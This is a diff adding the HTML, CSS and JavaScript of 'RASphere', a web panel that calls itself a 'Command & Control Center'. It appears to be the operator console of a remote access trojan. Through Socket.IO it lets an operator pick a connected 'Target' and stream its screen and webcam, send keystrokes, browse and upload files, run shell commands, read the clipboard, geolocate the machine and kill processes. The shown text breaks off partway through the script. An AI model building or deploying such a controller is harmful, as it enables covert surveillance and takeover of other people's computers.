@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RASphere - Command Center</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --bg-elevated: #2d333b;
+            --border-color: #30363d;
+            --border-subtle: #21262d;
+            --text-primary: #e6edf3;
+            --text-secondary: #8b949e;
+            --text-muted: #6e7681;
+            --accent-blue: #58a6ff;
+            --accent-green: #3fb950;
+            --accent-red: #f85149;
+            --accent-orange: #d2991d;
+            --accent-purple: #a371f7;
+            --accent-cyan: #39d2c0;
+            --shadow-lg: 0 8px 30px rgba(0,0,0,0.4);
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
+            --radius-sm: 6px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --font-mono: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
+            --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --sidebar-width: 260px;
+            --sidebar-collapsed: 56px;
+            --topbar-height: 48px;
+        }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { height: 100%; overflow: hidden; }
+        body { font-family: var(--font-sans); background: var(--bg-primary); color: var(--text-primary); display: flex; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--bg-elevated); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+        /* Login */
+        #login-overlay { position: fixed; inset: 0; z-index: 9999; background: var(--bg-primary); display: flex; align-items: center; justify-content: center; flex-direction: column; }
+        #login-overlay.hidden { display: none; }
+        .login-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--radius-lg); padding: 40px; width: 380px; max-width: 90vw; box-shadow: var(--shadow-lg); text-align: center; }
+        .login-card .logo { font-size: 28px; font-weight: 700; margin-bottom: 8px; background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .login-card .subtitle { color: var(--text-secondary); font-size: 14px; margin-bottom: 32px; }
+        .login-card input { width: 100%; padding: 12px 16px; margin-bottom: 12px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); color: var(--text-primary); font-size: 15px; outline: none; transition: var(--transition); }
+        .login-card input:focus { border-color: var(--accent-blue); box-shadow: 0 0 0 3px rgba(88,166,255,0.15); }
+        .login-card button { width: 100%; padding: 12px; margin-top: 8px; background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple)); color: #fff; border: none; border-radius: var(--radius-sm); font-size: 15px; font-weight: 600; cursor: pointer; transition: var(--transition); }
+        .login-card button:hover { opacity: 0.9; transform: translateY(-1px); }
+        .login-card .error-msg { color: var(--accent-red); font-size: 13px; margin-top: 12px; min-height: 20px; }
+
+        /* Topbar */
+        #topbar { position: fixed; top: 0; left: 0; right: 0; height: var(--topbar-height); background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); display: flex; align-items: center; padding: 0 16px; z-index: 100; gap: 12px; }
+        #topbar .brand { font-weight: 700; font-size: 16px; background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        #topbar .spacer { flex: 1; }
+        #topbar .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent-green); animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        #topbar .status-text { font-size: 12px; color: var(--text-secondary); }
+        #topbar select { background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: var(--radius-sm); padding: 6px 12px; font-size: 12px; cursor: pointer; max-width: 200px; }
+        #topbar button { background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-secondary); padding: 6px 12px; border-radius: var(--radius-sm); font-size: 12px; cursor: pointer; transition: var(--transition); }
+        #topbar button:hover { color: var(--text-primary); border-color: var(--text-muted); }
+        #topbar button.danger { border-color: var(--accent-red); color: var(--accent-red); }
+        #topbar button.danger:hover { background: var(--accent-red); color: #fff; }
+        .no-clients { color: var(--accent-red); font-size: 11px; }
+
+        /* Sidebar */
+        #sidebar { position: fixed; top: var(--topbar-height); left: 0; bottom: 0; width: var(--sidebar-width); background: var(--bg-secondary); border-right: 1px solid var(--border-color); transition: width var(--transition); z-index: 90; display: flex; flex-direction: column; overflow: hidden; }
+        #sidebar.collapsed { width: var(--sidebar-collapsed); }
+        #sidebar.collapsed .nav-label, #sidebar.collapsed .sidebar-section-title { display: none; }
+        #sidebar.collapsed .nav-icon { margin: 0 auto; }
+        #sidebar.collapsed .nav-item { justify-content: center; padding: 12px 0; }
+        .sidebar-nav { flex: 1; overflow-y: auto; padding: 8px 0; }
+        .sidebar-section-title { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); padding: 12px 16px 4px; font-weight: 600; }
+        .nav-item { display: flex; align-items: center; gap: 10px; padding: 10px 16px; color: var(--text-secondary); cursor: pointer; transition: var(--transition); font-size: 14px; border-left: 3px solid transparent; margin: 0 8px; border-radius: var(--radius-sm); white-space: nowrap; user-select: none; }
+        .nav-item:hover { background: var(--bg-tertiary); color: var(--text-primary); }
+        .nav-item.active { background: var(--bg-tertiary); color: var(--accent-blue); border-left-color: var(--accent-blue); }
+        .nav-icon { font-size: 18px; width: 22px; text-align: center; flex-shrink: 0; }
+        .nav-label { overflow: hidden; text-overflow: ellipsis; }
+        .sidebar-footer { border-top: 1px solid var(--border-color); padding: 8px; }
+
+        /* Main */
+        #main-content { position: fixed; top: var(--topbar-height); left: var(--sidebar-width); right: 0; bottom: 0; overflow: hidden; transition: left var(--transition); }
+        #main-content.expanded { left: var(--sidebar-collapsed); }
+        .panel { display: none; position: absolute; inset: 0; flex-direction: column; overflow: hidden; }
+        .panel.active { display: flex; }
+
+        /* Screen */
+        #screen-panel { background: #000; }
+        #screen-container { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; cursor: crosshair; }
+        #screen-image { max-width: 100%; max-height: 100%; object-fit: contain; user-select: none; pointer-events: none; }
+        #screen-placeholder { color: var(--text-muted); text-align: center; font-size: 16px; }
+        #screen-placeholder .icon { font-size: 64px; display: block; margin-bottom: 16px; opacity: 0.5; }
+        .screen-controls { display: flex; align-items: center; gap: 8px; padding: 8px 12px; background: var(--bg-secondary); border-top: 1px solid var(--border-color); flex-wrap: wrap; }
+        .screen-controls label { font-size: 12px; color: var(--text-secondary); }
+        .screen-controls select { background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: var(--radius-sm); padding: 4px 8px; font-size: 12px; }
+        .screen-controls .btn-sm { padding: 4px 10px; font-size: 11px; border-radius: var(--radius-sm); border: 1px solid var(--border-color); background: var(--bg-tertiary); color: var(--text-secondary); cursor: pointer; transition: var(--transition); white-space: nowrap; }
+        .screen-controls .btn-sm:hover { color: var(--text-primary); border-color: var(--text-muted); }
+        .screen-controls .btn-sm.active-stream { background: var(--accent-green); color: #fff; border-color: var(--accent-green); }
+        .shortcut-chips { display: flex; flex-wrap: wrap; gap: 4px; }
+
+        /* Files */
+        .files-toolbar { display: flex; gap: 8px; align-items: center; padding: 8px 12px; background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); flex-wrap: wrap; }
+        .files-toolbar button, .clipboard-widget button { padding: 6px 12px; font-size: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-color); background: var(--bg-tertiary); color: var(--text-secondary); cursor: pointer; transition: var(--transition); }
+        .files-toolbar button:hover, .clipboard-widget button:hover { color: var(--text-primary); border-color: var(--text-muted); }
+        #files-breadcrumb { flex: 1; font-size: 13px; color: var(--text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        #files-table { flex: 1; overflow-y: auto; }
+        #files-table table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        #files-table th { text-align: left; padding: 8px 12px; font-size: 11px; text-transform: uppercase; color: var(--text-muted); border-bottom: 1px solid var(--border-color); position: sticky; top: 0; background: var(--bg-primary); z-index: 1; }
+        #files-table td { padding: 6px 12px; border-bottom: 1px solid var(--border-subtle); }
+        #files-table tr:hover td { background: var(--bg-tertiary); }
+        #files-table .file-row { cursor: pointer; }
+        .file-size { color: var(--text-muted); font-size: 12px; text-align: right; }
+        .file-date { color: var(--text-muted); font-size: 12px; }
+        .clipboard-widget { padding: 8px 12px; display: flex; gap: 8px; align-items: center; background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); flex-wrap: wrap; }
+        .clipboard-widget textarea { flex: 1; background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: var(--radius-sm); padding: 8px; font-size: 13px; resize: vertical; min-height: 36px; max-height: 60px; }
+        .audio-widget { display: flex; gap: 8px; align-items: center; padding: 8px 12px; background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); }
+        .audio-widget label { font-size: 12px; color: var(--text-secondary); }
+        .audio-widget input[type="range"] { flex: 1; max-width: 150px; accent-color: var(--accent-blue); }
+
+        /* Terminal */
+        .terminal-toolbar { display: flex; gap: 8px; padding: 8px 12px; background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); }
+        #terminal-output { flex: 1; overflow-y: auto; padding: 12px; font-family: var(--font-mono); font-size: 13px; line-height: 1.5; background: #0a0a0a; color: var(--accent-green); white-space: pre-wrap; word-break: break-all; }
+        #terminal-input-row { display: flex; padding: 8px 12px; background: var(--bg-secondary); border-top: 1px solid var(--border-color); align-items: center; gap: 8px; }
+        #terminal-input-row .prompt { color: var(--accent-cyan); font-family: var(--font-mono); font-size: 13px; }
+        #terminal-input { flex: 1; background: transparent; border: none; color: var(--text-primary); font-family: var(--font-mono); font-size: 13px; outline: none; }
+        .terminal-placeholder { color: var(--text-muted); text-align: center; padding: 40px; }
+
+        /* Stats */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 12px; padding: 16px; overflow-y: auto; flex: 1; }
+        .stat-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; }
+        .stat-card .stat-title { font-size: 12px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 0.05em; margin-bottom: 12px; }
+        .stat-card .stat-value { font-size: 28px; font-weight: 700; }
+        .stat-card .stat-unit { font-size: 12px; color: var(--text-secondary); margin-left: 4px; }
+        .progress-bar { height: 6px; background: var(--bg-tertiary); border-radius: 3px; overflow: hidden; margin-top: 8px; }
+        .progress-bar .fill { height: 100%; border-radius: 3px; transition: width 0.5s ease; }
+        .fill-cpu { background: linear-gradient(90deg, var(--accent-blue), var(--accent-purple)); }
+        .fill-ram { background: linear-gradient(90deg, var(--accent-orange), var(--accent-red)); }
+        .fill-disk { background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan)); }
+        #processes-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 12px; }
+        #processes-table th { text-align: left; padding: 6px 8px; border-bottom: 1px solid var(--border-color); font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
+        #processes-table td { padding: 4px 8px; border-bottom: 1px solid var(--border-subtle); }
+        #processes-table tr:hover td { background: var(--bg-tertiary); }
+        .kill-btn { padding: 2px 8px; font-size: 11px; border-radius: 4px; border: 1px solid var(--accent-red); background: transparent; color: var(--accent-red); cursor: pointer; transition: var(--transition); }
+        .kill-btn:hover { background: var(--accent-red); color: #fff; }
+        .quick-actions { display: flex; flex-wrap: wrap; gap: 8px; padding: 8px 16px 16px; }
+        .quick-actions button { padding: 6px 14px; font-size: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-color); background: var(--bg-tertiary); color: var(--text-secondary); cursor: pointer; }
+        .quick-actions button:hover { color: var(--text-primary); border-color: var(--text-muted); }
+        .quick-actions button.warn { border-color: var(--accent-orange); color: var(--accent-orange); }
+        .quick-actions button.warn:hover { background: var(--accent-orange); color: #000; }
+
+        /* Toast */
+        #toast-container { position: fixed; top: 56px; right: 16px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; pointer-events: none; }
+        .toast { background: var(--bg-elevated); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 12px 16px; font-size: 13px; box-shadow: var(--shadow-lg); animation: slideIn 0.3s ease; pointer-events: auto; max-width: 360px; }
+        .toast.success { border-left: 3px solid var(--accent-green); }
+        .toast.error { border-left: 3px solid var(--accent-red); }
+        .toast.info { border-left: 3px solid var(--accent-blue); }
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        @media (max-width: 768px) {
+            #sidebar { width: var(--sidebar-collapsed); }
+            #sidebar .nav-label, #sidebar .sidebar-section-title { display: none; }
+            #sidebar .nav-icon { margin: 0 auto; }
+            #sidebar .nav-item { justify-content: center; padding: 12px 0; }
+            #main-content { left: var(--sidebar-collapsed); }
+            .stats-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="login-overlay">
+    <div class="login-card">
+        <div class="logo">⚡ RASphere</div>
+        <div class="subtitle">Command & Control Center</div>
+        <input type="text" id="login-username" placeholder="Username" autocomplete="off">
+        <input type="password" id="login-password" placeholder="Password">
+        <button id="login-btn" onclick="doLogin()">Sign In</button>
+        <div class="error-msg" id="login-error"></div>
+    </div>
+</div>
+
+<!-- TOPBAR -->
+<div id="topbar">
+    <span class="brand">⚡ RASphere</span>
+    <span class="status-dot" id="connection-dot"></span>
+    <span class="status-text" id="connection-text">Connected</span>
+    <span style="color:var(--text-muted);font-size:11px;">| Target:</span>
+    <select id="client-selector" onchange="selectClient(this.value)">
+        <option value="">-- No clients --</option>
+    </select>
+    <span class="no-clients" id="no-clients-msg">No clients connected</span>
+    <span class="spacer"></span>
+    <button onclick="toggleSidebar()">☰</button>
+    <button onclick="logout()">Logout</button>
+    <button class="danger" onclick="killSwitch()">⏻ Kill All</button>
+</div>
+
+<!-- SIDEBAR -->
+<div id="sidebar">
+    <div class="sidebar-nav">
+        <div class="sidebar-section-title">Remote Control</div>
+        <div class="nav-item active" data-panel="screen-panel" onclick="switchPanel('screen-panel', this)">
+            <span class="nav-icon">🖥️</span><span class="nav-label">Screen Viewer</span>
+        </div>
+        <div class="nav-item" data-panel="webcam-panel" onclick="switchPanel('webcam-panel', this)">
+            <span class="nav-icon">📷</span><span class="nav-label">Webcam</span>
+        </div>
+        <div class="sidebar-section-title">Tools</div>
+        <div class="nav-item" data-panel="files-panel" onclick="switchPanel('files-panel', this)">
+            <span class="nav-icon">📁</span><span class="nav-label">File Manager</span>
+        </div>
+        <div class="nav-item" data-panel="terminal-panel" onclick="switchPanel('terminal-panel', this)">
+            <span class="nav-icon">⬛</span><span class="nav-label">Terminal</span>
+        </div>
+        <div class="nav-item" data-panel="fun-panel" onclick="switchPanel('fun-panel', this)">
+            <span class="nav-icon">🎮</span><span class="nav-label">Fun Commands</span>
+        </div>
+        <div class="sidebar-section-title">Dashboard</div>
+        <div class="nav-item" data-panel="stats-panel" onclick="switchPanel('stats-panel', this)">
+            <span class="nav-icon">📊</span><span class="nav-label">System Monitor</span>
+        </div>
+    </div>
+    <div class="sidebar-footer">
+        <div class="nav-item" onclick="toggleSidebar()">
+            <span class="nav-icon">◀</span><span class="nav-label">Collapse</span>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN -->
+<div id="main-content">
+
+    <!-- SCREEN -->
+    <div id="screen-panel" class="panel active">
+        <div id="screen-container">
+            <div id="screen-placeholder"><span class="icon">🖥️</span>Select a client and click "Start Stream"</div>
+            <img id="screen-image" alt="Live Screen" style="display:none;">
+        </div>
+        <div class="screen-controls">
+            <button id="stream-toggle-btn" class="btn-sm" onclick="toggleScreenStream()">▶ Start Stream</button>
+            <label>Quality:</label>
+            <select id="quality-select" onchange="setQuality()">
+                <option value="30">Low</option><option value="55" selected>Medium</option><option value="85">High</option>
+            </select>
+            <label>Scale:</label>
+            <select id="scale-select" onchange="setScale()">
+                <option value="0.3">30%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1.0">100%</option>
+            </select>
+            <button class="btn-sm" id="track-btn" onclick="toggleCursorTracking()">👆 Track Off</button>
+            <span style="color:var(--text-muted);font-size:11px;" id="fps-display">FPS: --</span>
+            <span class="spacer" style="flex:1;"></span>
+            <span class="shortcut-chips">
+                <button class="btn-sm" onclick="sendShortcut('win_d')">Win+D</button>
+                <button class="btn-sm" onclick="sendShortcut('alt_tab')">Alt+Tab</button>
+                <button class="btn-sm" onclick="sendShortcut('ctrl_alt_del')">Ctrl+Alt+Del</button>
+                <button class="btn-sm" onclick="sendShortcut('alt_f4')">Alt+F4</button>
+                <button class="btn-sm" onclick="sendShortcut('win_r')">Win+R</button>
+                <button class="btn-sm" onclick="sendShortcut('ctrl_c')">Ctrl+C</button>
+                <button class="btn-sm" onclick="sendShortcut('ctrl_v')">Ctrl+V</button>
+            </span>
+        </div>
+    </div>
+
+    <!-- WEB CAM -->
+    <div id="webcam-panel" class="panel" style="background:#000;">
+        <div style="flex:1;display:flex;align-items:center;justify-content:center;">
+            <div id="webcam-placeholder" style="color:var(--text-muted);text-align:center;"><span style="font-size:64px;display:block;margin-bottom:16px;opacity:0.5;">📷</span>Click Start Webcam</div>
+            <img id="webcam-image" alt="Webcam" style="display:none;max-width:100%;max-height:100%;object-fit:contain;">
+        </div>
+        <div class="screen-controls">
+            <button id="webcam-toggle-btn" class="btn-sm" onclick="toggleWebcam()">▶ Start Webcam</button>
+            <label>Quality:</label>
+            <select id="webcam-quality" onchange="emitToClient('set_webcam_quality',{quality:parseInt(this.value)})">
+                <option value="30">Low</option><option value="55" selected>Medium</option><option value="85">High</option>
+            </select>
+        </div>
+    </div>
+
+    <!-- FUN COMMANDS -->
+    <div id="fun-panel" class="panel">
+        <div style="padding:16px;overflow-y:auto;flex:1;display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;">
+            <div class="stat-card"><div class="stat-title">🖼 Wallpaper</div><input id="wp-path" placeholder="Image path on target" style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('wallpaper_set',{path:document.getElementById('wp-path').value})" style="width:100%;">Apply</button></div>
+            <div class="stat-card"><div class="stat-title">💬 Popup</div><input id="mb-title" placeholder="Title" value="RASphere" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><input id="mb-text" placeholder="Message" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('msgbox_show',{title:document.getElementById('mb-title').value,text:document.getElementById('mb-text').value})" style="width:100%;">Show</button></div>
+            <div class="stat-card"><div class="stat-title">🌐 Open URL</div><input id="url-inp" placeholder="https://..." style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('open_url',{url:document.getElementById('url-inp').value})" style="width:100%;">Open</button></div>
+            <div class="stat-card"><div class="stat-title">📸 Screenshot</div><button class="btn-sm" onclick="emitToClient('take_screenshot')" style="width:100%;margin:6px 0;">Take Now</button><div id="ss-preview" style="max-height:120px;overflow:hidden;"></div></div>
+            <div class="stat-card"><div class="stat-title">📍 GeoIP</div><button class="btn-sm" onclick="emitToClient('get_geoip')" style="width:100%;margin:6px 0;">Locate</button><div id="geo-result" style="font-size:12px;color:var(--text-secondary);"></div></div>
+            <div class="stat-card"><div class="stat-title">📦 Apps</div><button class="btn-sm" onclick="emitToClient('get_apps')" style="width:100%;margin:6px 0;">List</button><div id="apps-result" style="font-size:11px;max-height:200px;overflow-y:auto;color:var(--text-secondary);"></div></div>
+            <div class="stat-card"><div class="stat-title">🔍 Search Files</div><input id="sr-root" value="C:\\" placeholder="Root" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><input id="sr-pat" placeholder="Pattern" style="width:100%;padding:6px;margin:4px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-primary);border-radius:4px;font-size:12px;"><button class="btn-sm" onclick="emitToClient('search_files',{root:document.getElementById('sr-root').value,pattern:document.getElementById('sr-pat').value})" style="width:100%;">Search</button><div id="sr-result" style="font-size:11px;max-height:100px;overflow-y:auto;color:var(--text-secondary);"></div></div>
+            <div class="stat-card"><div class="stat-title">⚡ Shell</div><input id="sh-cmd" placeholder="whoami" style="width:100%;padding:6px;margin:6px 0;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--accent-green);border-radius:4px;font-size:12px;font-family:var(--font-mono);"><button class="btn-sm" onclick="emitToClient('execute_command',{command:document.getElementById('sh-cmd').value})" style="width:100%;">Run</button><pre id="sh-out" style="font-size:11px;color:var(--accent-green);max-height:120px;overflow-y:auto;margin-top:6px;background:#0a0a0a;padding:6px;border-radius:4px;font-family:var(--font-mono);white-space:pre-wrap;"></pre></div>
+            <div class="stat-card"><div class="stat-title">🔊 Sound</div><button class="btn-sm" onclick="emitToClient('play_sound',{freq:800,dur:1})" style="width:100%;margin:6px 0;">Beep</button><button class="btn-sm" onclick="emitToClient('play_sound',{freq:1200,dur:2})" style="width:100%;">Long Beep</button></div>
+        </div>
+    </div>
+
+    <!-- FILES -->
+    <div id="files-panel" class="panel">
+        <div class="clipboard-widget">
+            <textarea id="clipboard-textarea" placeholder="Clipboard text..."></textarea>
+            <button onclick="clipboardGet()">📋 Get</button>
+            <button onclick="clipboardSet()">📤 Set</button>
+        </div>
+        <div class="audio-widget">
+            <button id="mute-btn" onclick="audioToggleMute()">🔊 Mute</button>
+            <label>Volume:</label>
+            <input type="range" id="volume-slider" min="0" max="100" value="50" onchange="audioSetVolume(this.value)">
+            <span id="volume-label" style="font-size:12px;color:var(--text-secondary);">50%</span>
+        </div>
+        <div class="files-toolbar">
+            <button onclick="fileNavigateUp()">⬆ Up</button>
+            <button onclick="fileRefresh()">🔄 Refresh</button>
+            <span id="files-breadcrumb">/</span>
+            <button onclick="fileNewFolder()">📁+ New Folder</button>
+            <button onclick="document.getElementById('file-upload-input').click()">📤 Upload</button>
+            <input type="file" id="file-upload-input" style="display:none;" onchange="fileUpload(this)">
+        </div>
+        <div id="files-table"></div>
+    </div>
+
+    <!-- TERMINAL -->
+    <div id="terminal-panel" class="panel">
+        <div class="terminal-toolbar">
+            <button id="terminal-toggle-btn" class="btn-sm" onclick="toggleTerminal()">▶ Start Terminal</button>
+            <button class="btn-sm" onclick="clearTerminal()">Clear</button>
+        </div>
+        <div id="terminal-output"><div class="terminal-placeholder">Start terminal to execute remote commands</div></div>
+        <div id="terminal-input-row">
+            <span class="prompt">$</span>
+            <input type="text" id="terminal-input" placeholder="Type command..." onkeydown="terminalKeydown(event)">
+        </div>
+    </div>
+
+    <!-- STATS -->
+    <div id="stats-panel" class="panel">
+        <div class="quick-actions">
+            <button onclick="emitToClient('power_monitor_off')">🖥️ Monitor Off</button>
+            <button onclick="emitToClient('power_lock')">🔒 Lock PC</button>
+            <button class="warn" onclick="emitToClient('power_sleep')">😴 Sleep PC</button>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-title">CPU</div>
+                <div class="stat-value" id="stat-cpu">--<span class="stat-unit">%</span></div>
+                <div class="progress-bar"><div class="fill fill-cpu" id="cpu-bar" style="width:0%"></div></div>
+                <div style="font-size:11px;color:var(--text-muted);margin-top:4px;" id="stat-cpu-cores"></div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Memory</div>
+                <div class="stat-value" id="stat-ram">--<span class="stat-unit">GB</span></div>
+                <div class="progress-bar"><div class="fill fill-ram" id="ram-bar" style="width:0%"></div></div>
+                <div style="font-size:11px;color:var(--text-muted);margin-top:4px;" id="stat-ram-detail"></div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Disk</div>
+                <div class="stat-value" id="stat-disk">--<span class="stat-unit">GB free</span></div>
+                <div class="progress-bar"><div class="fill fill-disk" id="disk-bar" style="width:0%"></div></div>
+                <div style="font-size:11px;color:var(--text-muted);margin-top:4px;" id="stat-disk-detail"></div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Network</div>
+                <div style="font-size:13px;color:var(--text-secondary);" id="stat-net"></div>
+            </div>
+        </div>
+        <div style="padding:0 16px 8px;"><span class="stat-title">Processes</span></div>
+        <div style="flex:1;overflow-y:auto;padding:0 16px 16px;">
+            <table id="processes-table">
+                <thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>Mem%</th><th>Action</th></tr></thead>
+                <tbody id="processes-tbody"></tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<div id="toast-container"></div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+    const APP = {
+        socket: null, authenticated: false, streaming: false, terminalActive: false,
+        currentPanel: 'screen-panel', currentFilePath: '', frameCount: 0, lastFrameTime: 0,
+        fpsHistory: [], cursorTracking: false, selectedClient: null, clients: {}
+    };
+
+    function initSocket() {
+        APP.socket = io({ reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 2000, reconnectionDelayMax: 15000, timeout: 20000 });
+
+        APP.socket.on('connect', () => updateConnectionStatus(true));
+        APP.socket.on('disconnect', () => { updateConnectionStatus(false); APP.streaming = false; updateStreamButton(); });
+        APP.socket.on('reconnect', () => { updateConnectionStatus(true); showToast('Reconnected', 'success'); });
+
+        APP.socket.on('login_response', data => {
+            if (data.success) {
+                APP.authenticated = true;
+                document.getElementById('login-overlay').classList.add('hidden');
+                refreshClientList();
+                showToast('Connected to Command Center', 'success');
+            } else { document.getElementById('login-error').textContent = data.error || 'Failed'; }
+        });
+
+        APP.socket.on('auth_required', () => { APP.authenticated = false; document.getElementById('login-overlay').classList.remove('hidden'); });
+
+        // Client events
+        APP.socket.on('client_joined', data => { APP.clients[data.id] = data; updateClientSelector(); showToast(`Client online: ${data.hostname}`, 'success'); });
+        APP.socket.on('client_left', data => { delete APP.clients[data.id]; updateClientSelector(); if (APP.selectedClient === data.id) { APP.selectedClient = null; document.getElementById('client-selector').value = ''; } showToast(`Client offline: ${data.id}`, 'error'); });
+
+        // Screen frames (relayed from client)
+        APP.socket.on('screen_frame', data => {
+            if (!APP.streaming) return;
+            const img = document.getElementById('screen-image');
+            img.src = 'data:image/jpeg;base64,' + data.image;
+            img.style.display = 'block';
+            document.getElementById('screen-placeholder').style.display = 'none';
+            APP.frameCount++;
+            const now = performance.now();
+            if (now - APP.lastFrameTime >= 1000) {
+                const fps = Math.round(APP.frameCount / ((now - APP.lastFrameTime) / 1000));
+                APP.fpsHistory.push(fps); if (APP.fpsHistory.length > 10) APP.fpsHistory.shift();
+                document.getElementById('fps-display').textContent = `FPS: ${Math.round(APP.fpsHistory.reduce((a,b)=>a+b,0)/APP.fpsHistory.length)}`;
+                APP.frameCount = 0; APP.lastFrameTime = now;
+            }
+        });
+        APP.socket.on('screen_capture_status', data => { APP.streaming = data.active; updateStreamButton(); });
+
+        // Stats
+        APP.socket.on('system_stats', data => {
+            document.getElementById('stat-cpu').innerHTML = data.cpu_percent.toFixed(1) + '<span class="stat-unit">%</span>';
+            document.getElementById('cpu-bar').style.width = data.cpu_percent + '%';
+            document.getElementById('stat-cpu-cores').textContent = `${data.cpu_count} cores`;
+            document.getElementById('stat-ram').innerHTML = data.memory_used_gb + '<span class="stat-unit">GB</span>';
+            document.getElementById('ram-bar').style.width = data.memory_percent + '%';
+            document.getElementById('stat-ram-detail').textContent = `${data.memory_used_gb} / ${data.memory_total_gb} GB`;
+            document.getElementById('stat-disk').innerHTML = data.disk_free_gb + '<span class="stat-unit">GB free</span>';
+            document.getElementById('disk-bar').style.width = data.disk_percent + '%';
+            document.getElementById('stat-disk-detail').textContent = `${data.disk_free_gb} / ${data.disk_total_gb} GB`;
+            document.getElementById('stat-net').textContent = `Sent: ${data.net_sent_mb} MB | Recv: ${data.net_recv_mb} MB`;
+            if (APP.currentPanel === 'stats-panel') emitToClient('get_processes');
+        });
+
+        APP.socket.on('process_list', data => {
+            const tbody = document.getElementById('processes-tbody');
+            tbody.innerHTML = (data.processes || []).slice(0, 50).map(p =>
+                `<tr><td>${p.pid}</td><td>${escHtml(p.name)}</td><td>${p.cpu.toFixed(1)}%</td><td>${p.memory.toFixed(1)}%</td><td><button class="kill-btn" onclick="emitToClient('kill_process',{pid:${p.pid}})">Kill</button></td></tr>`
+            ).join('') || '<tr><td colspan="5">No processes</td></tr>';
+        });
+
+        // Terminal
+        APP.socket.on('terminal_output', data => {
+            const o = document.getElementById('terminal-output');
+            const ph = o.querySelector('.terminal-placeholder'); if (ph) ph.remove();
+            o.innerHTML += escHtml(data.text); o.scrollTop = o.scrollHeight;
+        });
+        APP.socket.on('terminal_status', data => { APP.terminalActive = data.active; updateTerminalButton(); });
+
+        // Clipboard
+        APP.socket.on('clipboard_data', data => {
+            if (data.error) showToast(data.error, 'error');
+            else { document.getElementById('clipboard-textarea').value = data.text || ''; showToast('Clipboard fetched', 'info'); }
+        });
